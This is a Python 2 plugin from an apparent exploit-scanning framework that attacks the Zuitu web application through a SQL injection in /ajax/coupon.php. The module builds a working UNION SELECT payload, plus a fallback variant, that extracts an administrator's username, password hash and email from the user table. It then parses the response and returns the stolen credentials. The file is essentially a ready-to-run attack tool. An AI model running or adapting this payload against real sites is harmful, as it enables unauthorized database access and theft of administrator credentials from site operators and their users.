# -*- coding: cp936 -*-
'''
Demo modules for ass_hole_hunter
Reprouct from mst
'''
from libs.functions import *
#import modules.*


class hunter_exploit:
    '''discuz'''
    infos = {
        'plugin_name':'Zuitu显错注入漏洞_coupon',
        'author':'demon',
        'update':'2015/10/06',
        'site':'http://www.dawner.info',
        'vuln_type':'sqlinjection',
        'vuln_source':'http://www.wooyun.org/bugs/wooyun-2014-066035'
        }
    opts  = {
        'url':'192.168.1.254 or default',
        }


    def __init__(self,url):
        self.url = url

    def exploit(self):
        '''start exploit'''
        print "========="
        #socket.setdefaulttimeout(20)
        exp_url = self.url+"/ajax/coupon.php?action=consume&secret=8&id=2')/**/and/**/1=2/**/union/**/select/**/1,2,0,4,5,6,concat(0x31,0x23,username,0x3a,password,0x23,email,0x7C),8,9,10,11,9999999999,13,14,15,16/**/from/**/user/**/where/**/manager=0x59/**/limit/**/0,1%23"
        exp_url_bak = self.url + "/ajax/coupon.php?action=consume&secret=8&id=2%27)/**/and/**/1=2/**/union/**/select/**/1,2,0,4,5,6,concat(0x31,0x23,username,0x3a,password,0x23,email,0x7C),8,9,10,11,9999999999,13,14,15/**/from/**/user/**/where/**/manager=0x59/**/limit/**/0,1%23"
        try:
            resp = url_get(exp_url).read()
        except Exception,e:
            print e
            exp_url = exp_url_bak
            resp = url_get(exp_url).read()
        try:
            match = re.search(r"#.*:.*#",resp)
            if match:
                print match.group(0)
                username = match.group(0)[1:-1].split(':')[0]
                password = match.group(0)[1:-1].split(':')[1]+'@4!@#$%@'
                print '[!]Zuitu exsit sqli at coupon.php.\n'
                print '[+]Vul_url:'+exp_url+'\n'
                exp_url =  str(exp_url)
                result = "username:"+username+"|password:"+password
                return result
                

            else:
                pass
        except Exception,e:
            print e
